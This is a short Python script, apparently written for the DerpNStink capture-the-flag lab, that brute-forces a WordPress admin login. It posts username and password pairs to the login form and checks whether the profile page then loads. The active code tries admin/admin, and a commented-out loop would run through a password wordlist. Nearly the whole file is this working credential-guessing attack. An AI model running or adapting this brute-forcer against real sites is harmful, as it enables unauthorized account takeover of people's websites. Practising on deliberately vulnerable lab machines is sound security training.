import itertools 
import string 
import sys  
import requests 
import argparse   

def brute( username , password , url)  :  

    with requests.Session() as s: 

        wp_admin = "http://derpnstink.local/weblog/wp-admin/profile.php"  
        #change this params if needed 
        PARAMS={ 
                'log':username, 'pwd':password,'wp-submit':'Log In',  
                'redirect_to' : wp_admin , 
                }  

        s.post(url = url, data = PARAMS )  

        status = s.get(wp_admin)

         
    return status.text , status.status_code 
 
def main () :   

    #parser
    parser = argparse.ArgumentParser()
    parser.add_argument("-u", "--username", help="valid username" )
    parser.add_argument("-url", "--url", help="url to attack  ")
     
    args = parser.parse_args()     
    print(brute('admin' , 'admin' , args.url)) 

'''
    #load the password files   
    with open("test.txt") as passwords:
        for password in passwords:  

            #valid username
            username = args.username   

            password = password.rstrip("\n" )  

            url = args.url   

            #brute force the login  
            status  = brute(username , password ,url )   
            print(f'{username} : {password} -----> {status} ')  

'''
if __name__ == "__main__":
    main()  



        
